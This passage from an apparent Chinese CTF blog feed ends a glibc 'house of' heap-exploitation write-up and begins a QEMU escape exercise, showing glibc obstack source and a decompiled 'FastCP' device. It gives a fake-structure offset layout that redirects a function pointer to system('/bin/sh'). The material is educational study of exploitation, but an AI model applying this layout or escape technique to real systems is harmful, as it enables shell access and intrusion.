class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里最终目标是<code>__printf_buffer_flush_obstack</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment"> process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      buf-&gt;base.write_base = obstack_next_free (buf-&gt;obstack);</span><br><span class="line">      buf-&gt;base.write_ptr = buf-&gt;base.write_base;</span><br><span class="line">      <span class="keyword">size_t</span> size = obstack_room (buf-&gt;obstack);</span><br><span class="line">      buf-&gt;base.write_end = buf-&gt;base.write_ptr + size;</span><br><span class="line">      <span class="comment">/* Reserve the space on the obstack size.  */</span></span><br><span class="line">      obstack_blank_fast (buf-&gt;obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Obtain the extra character.  */</span></span><br><span class="line">      buf-&gt;base.write_base = &amp;buf-&gt;ch;</span><br><span class="line">      buf-&gt;base.write_ptr = &amp;buf-&gt;ch;</span><br><span class="line">      buf-&gt;base.write_end = &amp;buf-&gt;ch + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的目标就是<code>obstack_1grow</code>，前面的绕过方式很简单，直接绕过就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> obstack_1grow(OBSTACK, datum)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, 1);      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>然后执行这个宏，宏中就有了我们熟悉的<code>_obstack_newchunk</code>函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute an aligned object_base in the new chunk */</span></span><br><span class="line">  object_base =</span><br><span class="line">    __PTR_ALIGN ((<span class="keyword">char</span> *) new_chunk, new_chunk-&gt;contents, h-&gt;alignment_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Move the existing object to the new chunk.</span></span><br><span class="line"><span class="comment">     Word at a time is fast and is safe if the object</span></span><br><span class="line"><span class="comment">     is sufficiently aligned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (h-&gt;alignment_mask + <span class="number">1</span> &gt;= DEFAULT_ALIGNMENT)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) - <span class="number">1</span>;</span><br><span class="line">   i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">((COPYING_UNIT *) object_base)[i]</span><br><span class="line">  = ((COPYING_UNIT *) h-&gt;object_base)[i];</span><br><span class="line">      <span class="comment">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,</span></span><br><span class="line"><span class="comment"> but that can cross a page boundary on a machine</span></span><br><span class="line"><span class="comment"> which does not do strict alignment for COPYING_UNITS.  */</span></span><br><span class="line">      already = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) * <span class="keyword">sizeof</span> (COPYING_UNIT);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    already = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Copy remaining bytes one by one.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = already; i &lt; obj_size; i++)</span><br><span class="line">    object_base[i] = h-&gt;object_base[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the object just copied was the only data in OLD_CHUNK,</span></span><br><span class="line"><span class="comment">     free that chunk and remove it from the chain.</span></span><br><span class="line"><span class="comment">     But not if that chunk might contain an empty object.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!h-&gt;maybe_empty_object</span><br><span class="line">      &amp;&amp; (h-&gt;object_base</span><br><span class="line">  == __PTR_ALIGN ((<span class="keyword">char</span> *) old_chunk, old_chunk-&gt;contents,</span><br><span class="line">  h-&gt;alignment_mask)))</span><br><span class="line">    &#123;</span><br><span class="line">      new_chunk-&gt;prev = old_chunk-&gt;prev;</span><br><span class="line">      CALL_FREEFUN (h, old_chunk);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  h-&gt;object_base = object_base;</span><br><span class="line">  h-&gt;next_free = h-&gt;object_base + obj_size;</span><br><span class="line">  <span class="comment">/* The new chunk certainly contains no empty object yet.  */</span></span><br><span class="line">  h-&gt;maybe_empty_object = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里又可以看到我们熟悉的宏<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>当<code>(h)-&gt;use_extra_arg</code>不为0时即可执行到<code>(h)-&gt;chunkfun</code>。现在就是整条链子的调用了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里没有一点一点分析每个if语句应该怎么写，这里直接给出总的就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*(A + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x28</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0x30</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0xd8</span>) = _IO_printf_buffer_as_file_jumps;</span><br><span class="line">*(A + <span class="number">0xe0</span>) = A + <span class="number">0xe8</span>;</span><br><span class="line">*(A + <span class="number">0xe8</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0xf0</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0xf8</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0x108</span>) = <span class="number">11</span>;</span><br><span class="line">*(A + <span class="number">0x110</span>) = A + <span class="number">0x110</span>;</span><br><span class="line">*(A + <span class="number">0x128</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x130</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x148</span>) = &amp;system;</span><br><span class="line">*(A + <span class="number">0x158</span>) = &amp;bin_sh;</span><br><span class="line">*(A + <span class="number">0x160</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>​    <a class="link"   href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd" >https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这house of系列是真的多，上一个还没捂热下一个就来了，glibc更新也是真快。不过能在学习新东西的途中水一篇文章还是相当不错的。&lt;/p&gt;
&lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>QEMU逃逸练习</title>
    <link href="https://cv196082.gitee.io/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/"/>
    <id>https://cv196082.gitee.io/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/</id>
    <published>2023-03-21T07:57:03.000Z</published>
    <updated>2023-03-21T07:58:58.961Z</updated>
    
    <content type="html"><![CDATA[<p>可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。</p><h2 id="FastCP-ctf"><a href="#FastCP-ctf" class="headerlink" title="FastCP-ctf"></a>FastCP-ctf</h2><p>关于设备的分析可以参考前面两篇文章，这里就不再赘述了。</p><h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先就是read函数这里是非常常规的一些内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再就是write函数，可以修改<code>opaque-&gt;cp_state.cmd</code>、<code>opaque-&gt;cp_state.CP_list_cnt</code>、<code>opaque-&gt;cp_state.CP_list_src</code>，并且可以看到中间会触发timer。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_cp_timer</span><span class="params">(FastCPState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> CP_list_cnt; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v8; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  FastCP_CP_INFO cp_info; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// read</span></span><br><span class="line">        <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);<span class="comment">// write</span></span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( CP_list_cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;</span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !CP_list_cnt )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">          v6 = cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">          opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v12 &gt; <span class="number">0x1000</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">          ++v4;</span><br><span class="line">          v3 += <span class="number">24LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt;= v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;cp_state.cmd = <span class="number">0LL</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  opaque-&gt;handling = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在timer中存在三个由cmd属性控制的分支，这里直接说三个分支的功能：</p><ol><li>  